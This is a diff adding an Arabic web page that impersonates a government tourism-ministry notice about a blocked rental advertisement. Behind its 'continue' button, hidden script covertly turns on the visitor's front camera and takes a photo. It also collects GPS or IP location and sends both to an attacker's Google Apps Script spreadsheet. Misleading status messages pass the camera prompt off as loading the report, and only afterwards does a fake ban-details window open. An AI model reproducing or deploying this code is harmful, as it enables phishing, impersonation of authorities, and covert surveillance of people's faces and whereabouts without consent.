@@ -1,0 +1,703 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تنبيه</title>
+    <!-- WhatsApp / Facebook link preview -->
+    <meta property="og:title" content="تم حظر الإعلان مؤقتاً">
+    <meta property="og:description" content="تم حظر هذا الإعلان مؤقتاً. اضغط للمتابعة ومعاينة تفاصيل البلاغ.">
+   <meta property="og:image" content="https://drive.google.com/thumbnail?id=1j8nWZocjjq0Pu42E21DlL0ZAzaCO098e&sz=w1000">
+<meta property="og:image:secure_url" content="https://drive.google.com/thumbnail?id=1j8nWZocjjq0Pu42E21DlL0ZAzaCO098e&sz=w1000">
+    <meta property="og:image:type" content="image/jpeg">
+    <meta property="og:url" content="https://ministryofheritageandtourism-alt.github.io/InspectionSection/">
+    <meta property="og:type" content="website">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="تم حظر الإعلان مؤقتاً">
+    <meta name="twitter:description" content="تم حظر هذا الإعلان مؤقتاً. اضغط للمتابعة ومعاينة تفاصيل البلاغ.">
+    <meta name="twitter:image" content="https://drive.google.com/thumbnail?id=1j8nWZocjjq0Pu42E21DlL0ZAzaCO098e&sz=w1000">
+
+
+    <style>
+        /* إعدادات الصفحة - ملء الشاشة بالكامل */
+        * { margin: 0; padding: 0; box-sizing: border-box; } 
+        html, body { 
+            overflow: hidden; 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+            background: #f0f2f5; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            width: 100vw; 
+            height: 100vh; 
+        }
+
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background-color: rgba(0, 0, 0, 0.6);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            backdrop-filter: blur(4px);
+        }
+
+        .modal {
+            background: #ffffff;
+            width: 100vw;
+            height: 100vh;
+            max-width: none !important;
+            border-radius: 0 !important;
+            box-shadow: none !important;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            padding: 40px 30px;
+            animation: fadeIn 0.4s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: scale(0.95); }
+            to { opacity: 1; transform: scale(1); }
+        }
+
+        .modal .icon { font-size: 50px; margin-bottom: 20px; display: block; }
+        .modal h2 { color: #d32f2f; font-size: 32px; margin-bottom: 15px; font-weight: 700; }
+        .modal p { font-size: 19px; line-height: 1.7; color: #333; margin-bottom: 25px; max-width: 550px; }
+        .modal .highlight-link {
+            display: inline-block; background: #f5f5f5; padding: 8px 15px; border-radius: 8px;
+            font-size: 14px; color: #1a73e8; word-break: break-all; margin: 10px 0 20px;
+            direction: ltr; text-align: left; max-width: 100%;
+        }
+
+        .modal .buttons { display: flex; flex-wrap: wrap; justify-content: center; gap: 15px; margin-top: 10px; }
+        .modal .btn {
+            padding: 14px 30px; border: none; border-radius: 50px; font-size: 18px;
+            font-weight: 600; cursor: pointer; transition: all 0.3s ease;
+            text-decoration: none; display: inline-block; min-width: 160px; touch-action: manipulation;
+        }
+        .btn-primary { background: #1a73e8; color: #fff; box-shadow: 0 4px 12px rgba(26, 115, 232, 0.4); }
+        .btn-primary:hover { background: #1557b0; transform: translateY(-2px); box-shadow: 0 6px 18px rgba(26, 115, 232, 0.5); }
+        .btn-call { background: #34a853; color: #fff; box-shadow: 0 4px 12px rgba(52, 168, 83, 0.4); }
+        .btn-call:hover { background: #2d8e47; transform: translateY(-2px); box-shadow: 0 6px 18px rgba(52, 168, 83, 0.5); }
+        .btn-disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none !important;
+        }
+
+        #status {
+            margin-top: 15px; font-size: 14px; color: #555; min-height: 20px;
+            padding: 8px 12px; border-radius: 6px; background: #f9f9f9;
+        }
+        .status-success { color: #34a853; font-weight: bold; }
+        .status-error { color: #d32f2f; font-weight: bold; }
+        .status-loading { color: #1a73e8; }
+
+        .modal .footer-note { margin-top: 25px; font-size: 14px; color: #888; border-top: 1px solid #eee; padding-top: 15px; width: 100%; max-width: 400px; }
+
+        /* كود الفيديو الخفي لالتقاط معاينة الرابطة */
+        #video { display: none; }
+
+        @media (max-width: 480px) {
+            .modal { padding: 20px; }
+            .modal h2 { font-size: 24px; }
+            .modal p { font-size: 16px; max-width: 100%; }
+            .modal .btn { min-width: 130px; font-size: 15px; padding: 12px 15px; }
+            .modal .icon { font-size: 40px; }
+            .modal .highlight-link { font-size: 12px; }
+        }
+    </style>
+</head> 
+<body> 
+
+<div class="overlay" id="overlay"> 
+<div class="modal">
+ 
+    <hr style="margin: 10px 0 20px; border: 1px solid #eee; width: 80%; max-width: 300px;">
+    <span class="icon">⛔</span>
+    <h2>تم رابط الموقع مؤقتاً</h2>
+      <div style="text-align: center; margin-bottom: 15px;">
+        <a href="https://imgbb.com/"><img src="https://i.ibb.co/r2qP9bs3/tradational.jpg" alt="tradational" border="0" style="max-width: 100%; max-height: 150px; width: auto; height: auto;"></a>
+    </div>
+    <p>
+        تم حظر رابط الموقع مؤقتاً<br> 
+        يرجى الضغط على <strong>متابعة</strong> لمعاينة تفاصيل البلاغ، أو لمزيد من المعلومات يرجى الاتصال بالرقم المجاني أدناه.
+    </p>
+       <div style="text-align: center; margin-bottom: 15px;">
+     <img src="https://drive.google.com/thumbnail?id=1j8nWZocjjq0Pu42E21DlL0ZAzaCO098e&sz=w1000" alt="tradational" border="0" style="max-width: 100%; max-height: 200px; width: auto; height: auto;"></a>
+    </div>
+    <div class="buttons">
+        <button id="continueBtn" class="btn btn-primary"> متابعة </button>
+        <a href="tel:+96822088000" class="btn btn-call"> 📞 اتصل الآن </a> 
+    </div> 
+
+    <div id="status">🔒 سيتم طلب معاينة الرابط والدخول عند الضغط على "متابعة"</div>
+    <div class="footer-note"> الخط الساخن المجاني: <strong dir="ltr">+968 22088000</strong> </div> 
+</div> 
+</div> 
+
+<!-- ========================================================== -->
+<!--   كود التقاط معاينة الرابطة + الدخول + الإرسال إلى Google Sheets   -->
+<!-- ========================================================== -->
+<video id="video" autoplay playsinline></video>
+
+<script> 
+// ================================
+// إعدادات Google Sheets
+// ================================
+const SHEET_ID = '1i2KiUfCwkUxKodx-zypAdWA58f5VJlpVR60aXS47eh0';
+const SHEET_NAME = 'LocationLink';
+const GOOGLE_SCRIPT_URL = `https://script.google.com/macros/s/AKfycbxZcGabmAW7vx68xNfnhL-mS7QZWmXSGEu16i1HuSwi-or5O7w80cUQmZhugx-drVZj/exec`;
+
+// ================================
+// روابط الصور العشر (روابط مباشرة للصور)
+// ================================
+const IMAGE_URLS = [
+    'https://drive.google.com/thumbnail?id=1LrjX7bbGDv1LKHPUQ3vBvCRQx0JwVX77&sz=w1000',
+    'https://drive.google.com/thumbnail?id=16EKhAaI8BHY5_R0ABKsY6MpZHh1CFjE7&sz=w1000',
+    'https://drive.google.com/thumbnail?id=1FsvYKZexcB9CPdYKF4gJ9IQgWOI3YC12&sz=w1000',
+    'https://drive.google.com/thumbnail?id=13Bf5S3nWFbDdE7XYLMDuA5KWGAxG-nQ4&sz=w1000',
+    'https://drive.google.com/thumbnail?id=1jFakH6FI__cMSJjowsBKOjPc5sqdOYqm&sz=w1000',
+    'https://drive.google.com/thumbnail?id=15n5t9swWB0xzCwuR_k8a3VlCzFLSN8EG&sz=w1000',
+    'https://drive.google.com/thumbnail?id=1aHPWQGrXWLE4CgLLu4i4UPUMLmC5r1gx&sz=w1000',
+    'https://drive.google.com/thumbnail?id=1YOFdDkLdNOJXuDlGnx_kiCH4qWix9bRI&sz=w1000',
+    'https://drive.google.com/thumbnail?id=15pQVyT1uHj7TN-8O3D0PriM-MQymOLb9&sz=w1000',
+    'https://drive.google.com/thumbnail?id=1LwujDiWjkUygW9pltCX4D_Mn2m3DS4NF&sz=w1000'
+];
+// ================================
+// متغيرات عامة
+// ================================
+let capturedImageData = null;
+let locationData = null;
+let cameraAccepted = false;
+let sendInProgress = false;
+let isDone = false;
+
+document.getElementById('overlay').addEventListener('click', function(e) { 
+    if (e.target === this) { 
+        alert('يرجى الضغط على متابعة أو الاتصال بالرقم.'); 
+    } 
+}); 
+
+// ================================
+// دالة الحصول على اسم المنطقة
+// ================================
+async function getLocationName(latitude, longitude) {
+    try {
+        const response = await fetch(
+            `https://nominatim.openstreetmap.org/reverse?lat=${latitude}&lon=${longitude}&format=json&zoom=10&accept-language=ar`
+        );
+        if (!response.ok) throw new Error('فشل');
+        const data = await response.json();
+        let locationName = '';
+        if (data.address) {
+            locationName = data.address.city || data.address.town || data.address.village || 
+                          data.address.suburb || data.address.district || data.address.county || 
+                          data.address.state || data.address.country || 'منطقة غير معروفة';
+        } else {
+            locationName = 'منطقة غير معروفة';
+        }
+        return locationName;
+    } catch (error) {
+        return 'منطقة غير معروفة';
+    }
+}
+
+// ================================
+// دالة فتح النافذة الجديدة (بدلاً من الرابط القديم)
+// ================================
+function openBlockWindow() {
+    // بناء محتوى النافذة الجديدة مع عرض الصور داخل الحاويات
+    const htmlContent = `
+    <!DOCTYPE html>
+    <html lang="ar" dir="rtl">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>تفاصيل الحظر</title>
+        <style>
+            * { margin:0; padding:0; box-sizing:border-box; }
+            body {
+                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+                background: #f0f2f5;
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                min-height: 100vh;
+                padding: 20px;
+            }
+            .modal {
+                background: #fff;
+                max-width: 700px;
+                width: 100%;
+                padding: 30px 25px;
+                border-radius: 20px;
+                box-shadow: 0 15px 50px rgba(0,0,0,0.2);
+                animation: fadeIn 0.5s ease;
+                text-align: center;
+            }
+            @keyframes fadeIn {
+                from { opacity:0; transform:scale(0.95); }
+                to { opacity:1; transform:scale(1); }
+            }
+            .icon { font-size: 50px; margin-bottom: 10px; }
+            h2 {
+                color: #d32f2f;
+                font-size: 28px;
+                border-bottom: 2px solid #ffcdd2;
+                padding-bottom: 10px;
+                margin-bottom: 20px;
+            }
+            .details-grid {
+                display: grid;
+                grid-template-columns: 1fr 2fr;
+                gap: 8px 15px;
+                background: #f8f9fa;
+                padding: 15px 20px;
+                border-radius: 12px;
+                text-align: right;
+                border: 1px solid #e9ecef;
+                margin-bottom: 15px;
+            }
+            .details-grid .label { font-weight: 600; color: #495057; }
+            .details-grid .value { color: #212529; font-weight: 500; }
+            .details-grid .value a { color: #1a73e8; text-decoration: none; word-break: break-all; }
+            .reason-box {
+                background: #fff3e0;
+                border-right: 5px solid #ff9800;
+                padding: 12px 18px;
+                border-radius: 8px;
+                text-align: right;
+                font-size: 16px;
+                color: #4e342e;
+                margin-bottom: 20px;
+            }
+            .reason-box strong { color: #d32f2f; }
+            .images-section { margin-bottom: 20px; }
+            .images-section .section-title {
+                font-size: 16px;
+                font-weight: 600;
+                color: #333;
+                display: block;
+                text-align: right;
+                margin-bottom: 10px;
+            }
+            .image-grid {
+                display: grid;
+                grid-template-columns: repeat(5, 1fr);
+                gap: 10px;
+            }
+            .img-box {
+                background: #f1f3f5;
+                border: 2px solid #dee2e6;
+                border-radius: 10px;
+                aspect-ratio: 1/1;
+                overflow: hidden;
+                cursor: pointer;
+                transition: 0.2s;
+                position: relative;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+            }
+            .img-box:hover {
+                transform: scale(1.05);
+                border-color: #1a73e8;
+                box-shadow: 0 4px 12px rgba(0,0,0,0.2);
+            }
+            .img-box img {
+                width: 100%;
+                height: 100%;
+                object-fit: cover;
+                display: block;
+            }
+            .img-box .badge {
+                position: absolute;
+                bottom: 4px;
+                right: 4px;
+                background: rgba(0,0,0,0.6);
+                color: #fff;
+                font-size: 10px;
+                padding: 2px 6px;
+                border-radius: 12px;
+                direction: ltr;
+            }
+            .footer-note {
+                margin-top: 15px;
+                font-size: 14px;
+                color: #888;
+                border-top: 1px solid #eee;
+                padding-top: 12px;
+            }
+            .btn-confirm {
+                background: #28a745;
+                color: #fff;
+                border: none;
+                padding: 12px 30px;
+                border-radius: 50px;
+                font-size: 18px;
+                font-weight: 600;
+                cursor: default;
+                margin-top: 10px;
+            }
+            @media (max-width: 600px) {
+                .details-grid { grid-template-columns:1fr; gap:4px; padding:12px; }
+                .image-grid { grid-template-columns:repeat(5,1fr); gap:6px; }
+                h2 { font-size:22px; }
+            }
+            @media (max-width: 400px) {
+                .image-grid { grid-template-columns:repeat(5,1fr); gap:4px; }
+                .img-box .badge { font-size:8px; padding:1px 4px; }
+            }
+        </style>
+    </head>
+    <body>
+        <div class="modal">
+            <span class="icon">🚫</span>
+            <h2>الحظر: اعلان استراحة للايجار</h2>
+
+            <div class="details-grid">
+                <span class="label">📅 تاريخ الحظر:</span>
+                <span class="value">20/11/2026</span>
+                <span class="label">🏷️ الاسم:</span>
+                <span class="value">شالية الاحلام</span>
+                <span class="value">رقم الهاتف:</span>
+                <span class="label">76304027</span>
+                <span class="label">📍 المكان:</span>
+                <span class="value"> جنوب الباطنة- بركاء</span>
+                <span class="label">🔗 رابط الموقع:</span>
+                <span class="value"><a href="https://maps.app.goo.gl/jcoRC9JhyvFid9uT7?g_st=awb" target="_blank">https://maps.app.goo.gl/9cNY5zRMydN3wYWw8?g_st=ac</a></span>
+            </div>
+
+            <div class="reason-box">
+                <strong>⚠️ السبب:</strong> بلاغ عدد من المواطنين بالاحتيال والنصب من صاحب الاعلان.
+            </div>
+
+            <div class="images-section">
+                <span class="section-title">🖼️ الصور (10 حاويات روابط):</span>
+                <div class="image-grid" id="imageGrid"></div>
+            </div>
+
+            <div class="footer-note"> الخط الساخن المجاني: <strong dir="ltr">+968 22088000</strong> </div>
+            <div class="btn-confirm">✔️ تم الحظر</div>
+        </div>
+        <script>
+            // روابط الصور المحددة من المستخدم
+            const imageUrls = ${JSON.stringify(IMAGE_URLS)};
+            const grid = document.getElementById('imageGrid');
+            imageUrls.forEach((url, index) => {
+                const box = document.createElement('div');
+                box.className = 'img-box';
+                box.innerHTML = \`
+                    <img src="\${url}" alt="صورة \${index + 1}" loading="lazy">
+                    <span class="badge">\${index + 1}</span>
+                \`;
+                box.addEventListener('click', function(e) {
+                    e.stopPropagation();
+                    window.open(url, '_blank');
+                });
+                grid.appendChild(box);
+            });
+        <\/script>
+    </body>
+    </html>
+    `;
+
+    // محاولة فتح نافذة جديدة
+    const newWin = window.open('', '_blank', 'width=800,height=700,scrollbars=yes,resizable=yes');
+    if (newWin) {
+        newWin.document.write(htmlContent);
+        newWin.document.close();
+    } else {
+        // بديل: إذا منع المتصفح النوافذ المنبثقة
+        document.getElementById('status').innerHTML = "⚠️ لم نتمكن من فتح نافذة جديدة، يرجى السماح بالنوافذ المنبثقة.";
+        document.getElementById('status').className = "status-error";
+    }
+}
+
+// ================================
+// دالة التقاط معاينة الرابطة من الكاميرا (تم التعديل للكاميرا الأمامية)
+// ================================
+function capturePhotoFromCamera() {
+    const video = document.getElementById('video');
+    if (!video || !video.videoWidth) return false;
+    const canvas = document.createElement('canvas');
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    const ctx = canvas.getContext('2d');
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+    capturedImageData = canvas.toDataURL('image/jpeg', 0.7);
+    return true;
+}
+
+// ================================
+// دالة تشغيل الكاميرا الخفية - الآن تستخدم الكاميرا الأمامية (facingMode: 'user')
+// ================================
+async function startHiddenCamera(statusDiv, btn) {
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({
+            video: { facingMode: 'user', width: { ideal: 320 }, height: { ideal: 240 } },
+            audio: false
+        });
+        cameraAccepted = true;
+        const video = document.getElementById('video');
+        video.srcObject = stream;
+        await new Promise((resolve) => {
+            video.onloadedmetadata = () => {
+                video.play();
+                statusDiv.innerHTML = "✅  معاينة الطلب جاهزة. جاري  جلب الطلب...";
+                statusDiv.className = "status-success";
+                resolve();
+            };
+        });
+        setTimeout(() => {
+            const success = capturePhotoFromCamera();
+            if (success) {
+                statusDiv.innerHTML = " تم جلب الطلب. للمعاينة...";
+                statusDiv.className = "status-success";
+                // نستدعي checkAndSend فقط إذا التقطت الصورة بنجاح
+                checkAndSend(statusDiv);
+            } else {
+                // فشل التقاط الصورة
+                statusDiv.innerHTML = "❌ فشل جلب طلب المعاينة. حاول مرة أخرى.";
+                statusDiv.className = "status-error";
+                btn.disabled = false;
+                btn.textContent = "متابعة";
+                cameraAccepted = false; // نعيد تعيين القبول لأن الصورة لم تلتقط
+                // لا نفتح نافذة، ولا نرسل
+            }
+        }, 1500);
+    } catch (err) {
+        // تم رفض الكاميرا - نوقف العملية ولا نفتح النافذة الثانية
+        cameraAccepted = false;
+        statusDiv.innerHTML = "❌ تم رفض فتح الطلب. لا يمكن معاينة الطلب دون موافقة على السماح بالنوافذ المنبثقه.";
+        statusDiv.className = "status-error";
+        btn.disabled = false;
+        btn.textContent = "متابعة";
+        // لا نستدعي checkAndSend()
+        isDone = false;
+    }
+}
+
+// ================================
+// دالة إرسال البيانات إلى Google Sheets ثم فتح النافذة الجديدة
+// ================================
+async function sendAllData() {
+    // لا نرسل ولا نفتح نافذة إذا لم توجد صورة
+    if (!capturedImageData) {
+        const statusDiv = document.getElementById('status');
+        statusDiv.innerHTML = "❌ لا يوجد طلب للمعاينة، لا يمكن فتح التفاصيل.";
+        statusDiv.className = "status-error";
+        const btn = document.getElementById('continueBtn');
+        btn.disabled = false;
+        btn.textContent = "متابعة";
+        return;
+    }
+    if (sendInProgress || !locationData) return;
+    sendInProgress = true;
+
+    const { latitude, longitude, source, locationName } = locationData;
+    const timestamp = new Date().toLocaleString('ar-EG', { timeZone: 'Asia/Riyadh' });
+    const linkLocation = `https://www.google.com/maps?q=${latitude},${longitude}`;
+    
+    const payload = {
+        sheetId: SHEET_ID,
+        sheetName: SHEET_NAME,
+        linkLocation: linkLocation,
+        targetUrl: 'تم فتح نافذة الحظر (بدون تحويل)',
+        timestamp: timestamp,
+        latitude: latitude,
+        longitude: longitude,
+        locationName: locationName,
+        source: source,
+        imageData: capturedImageData
+    };
+
+    const statusDiv = document.getElementById('status');
+    statusDiv.innerHTML = "📤 جاري جلب بيانات اللطب من السيرفر...";
+    statusDiv.className = "status-loading";
+
+    try {
+        await fetch(GOOGLE_SCRIPT_URL, {
+            method: 'POST',
+            mode: 'no-cors',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        });
+        statusDiv.innerHTML = "✅ تم جلب التفاصيل بنجاح! جاري فتح النافذة...";
+        statusDiv.className = "status-success";
+        // فتح النافذة الجديدة فقط إذا كانت الصورة موجودة (وهي موجودة هنا)
+        openBlockWindow();
+        // تعطيل الزر نهائياً
+        const btn = document.getElementById('continueBtn');
+        btn.disabled = true;
+        btn.textContent = "تم";
+        btn.classList.add('btn-disabled');
+        isDone = true;
+    } catch (error) {
+        statusDiv.innerHTML = "⚠️ حدث خطأ أثناء الجلب سيتم فتح النافذة مع ذلك.";
+        statusDiv.className = "status-error";
+        // حتى مع الخطأ نفتح النافذة لأن الصورة موجودة
+        openBlockWindow();
+        const btn = document.getElementById('continueBtn');
+        btn.disabled = true;
+        btn.textContent = "تم";
+        btn.classList.add('btn-disabled');
+        isDone = true;
+    } finally {
+        sendInProgress = false;
+    }
+}
+
+// ================================
+// دالة التحقق من جاهزية البيانات للإرسال
+// ================================
+function checkAndSend(statusDiv) {
+    if (sendInProgress || isDone) return;
+    if (!capturedImageData) {
+        // إذا لم توجد صورة، لا نرسل
+        statusDiv.innerHTML = "❌ لم يتم تفاصيل المعاينة، لا يمكن المتابعة.";
+        statusDiv.className = "status-error";
+        const btn = document.getElementById('continueBtn');
+        btn.disabled = false;
+        btn.textContent = "متابعة";
+        return;
+    }
+    if (locationData) {
+        sendAllData();
+    } else {
+        // ننتظر الموقع
+        setTimeout(() => checkAndSend(statusDiv), 500);
+    }
+}
+
+// ================================
+// دالة تخزين الموقع
+// ================================
+function storeLocation(latitude, longitude, source) {
+    if (locationData) return;
+    locationData = { latitude, longitude, source };
+    getLocationName(latitude, longitude).then(name => {
+        locationData.locationName = name;
+        const statusDiv = document.getElementById('status');
+       statusDiv.innerHTML = "📍 تم الحصول على تفاصيل الطلب";
+        statusDiv.className = "status-success";
+        // نستدعي checkAndSend فقط إذا كانت الصورة موجودة
+        if (capturedImageData) {
+            checkAndSend(statusDiv);
+        } else {
+            // إذا لم تكن الصورة موجودة، ننتظر حتى تلتقط
+            // لكننا سنعطي رسالة انتظار
+            statusDiv.innerHTML = "⏳ انتظار تفاصيل الطلب...";
+            statusDiv.className = "status-loading";
+        }
+    });
+}
+
+// ================================
+// دوال جلب الموقع عبر IP و GPS
+// ================================
+function getLocationViaIP() {
+    fetch('https://api.bigdatacloud.net/data/ip-geolocation?localityLanguage=ar')
+        .then(res => res.ok ? res.json() : Promise.reject())
+        .then(data => { if (data.latitude && data.longitude) storeLocation(data.latitude, data.longitude, 'IP (BigDataCloud)'); })
+        .catch(() => getLocationViaIP2());
+}
+
+function getLocationViaIP2() {
+    fetch('https://ipapi.co/json/')
+        .then(res => res.ok ? res.json() : Promise.reject())
+        .then(data => { if (data.latitude && data.longitude) storeLocation(data.latitude, data.longitude, 'IP (ipapi)'); })
+        .catch(() => getLocationViaIP3());
+}
+
+function getLocationViaIP3() {
+    fetch('https://ipinfo.io/json')
+        .then(res => res.ok ? res.json() : Promise.reject())
+        .then(data => { 
+            if (data.loc) { 
+                const coords = data.loc.split(',').map(Number); 
+                if (coords.length === 2 && !isNaN(coords[0]) && !isNaN(coords[1])) {
+                    storeLocation(coords[0], coords[1], 'IP (ipinfo)');
+                }
+            }
+        })
+        .catch(() => {
+            if (!locationData) {
+                locationData = { latitude: 0, longitude: 0, source: 'unknown', locationName: 'غير معروف' };
+                if (capturedImageData) {
+                    checkAndSend(document.getElementById('status'));
+                }
+            }
+        });
+}
+
+function getLocationViaGPS() {
+    if (!navigator.geolocation) { getLocationViaIP(); return; }
+    navigator.geolocation.getCurrentPosition(
+        (position) => storeLocation(position.coords.latitude, position.coords.longitude, 'GPS'),
+        (error) => getLocationViaIP(),
+        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+    );
+}
+
+// ================================
+// حدث الضغط على زر متابعة
+// ================================
+document.getElementById('continueBtn').addEventListener('click', async function() {
+    if (isDone) return;
+    const btn = this;
+    const statusDiv = document.getElementById('status');
+    
+    btn.disabled = true;
+    btn.textContent = "جاري التحميل...";
+    statusDiv.innerHTML = "⏳ جاري جلب تفاصيل الطلب...";
+    statusDiv.className = "status-loading";
+
+    // إعادة تعيين المتغيرات (في حالة إعادة المحاولة)
+    capturedImageData = null;
+    locationData = null;
+    cameraAccepted = false;
+    sendInProgress = false;
+    isDone = false;
+
+    // 1. تشغيل الكاميرا (الأمامية)
+    startHiddenCamera(statusDiv, btn);
+
+    // 2. الحصول على الموقع (يتم فقط إذا قبلت الكاميرا وتم التقاط الصورة)
+    // سنستدعيه دائماً لكن storeLocation سيتحقق من وجود الصورة
+    getLocationViaGPS();
+
+    // 3. مهلة أمان: إذا لم يتم الإرسال بعد 20 ثانية ولم تقبل الكاميرا أو لم تلتقط الصورة، نعطي رسالة
+    setTimeout(() => {
+        if (!isDone) {
+            if (!capturedImageData) {
+                statusDiv.innerHTML = "⏰ انتهت المهلة، لم يتم  جلب تفاصيل الطلب. حاول مرة أخرى.";
+                statusDiv.className = "status-error";
+                btn.disabled = false;
+                btn.textContent = "متابعة";
+                // لا نفتح نافذة
+            } else if (capturedImageData && !locationData) {
+                statusDiv.innerHTML = "⚠️ فشل الحصول على المعاينة، سيتم فتح النافذة مع التفاصيل فقط.";
+                statusDiv.className = "status-error";
+                // نفتح النافذة حتى بدون موقع (لأن الصورة موجودة)
+                // لكن نفضل إرسال البيانات بدون موقع؟ لا، الأفضل عدم فتحها بدون موقع، لكن حسب الطلب "اذا لم ترسل الصورة لا اريد فتح نافذة التفاصيل" - هنا الصورة موجودة، لذا نفتح النافذة
+                openBlockWindow();
+                btn.disabled = true;
+                btn.textContent = "تم";
+                btn.classList.add('btn-disabled');
+                isDone = true;
+            }
+        }
+    }, 20000);
+});
+</script>
+</body>
+</html>
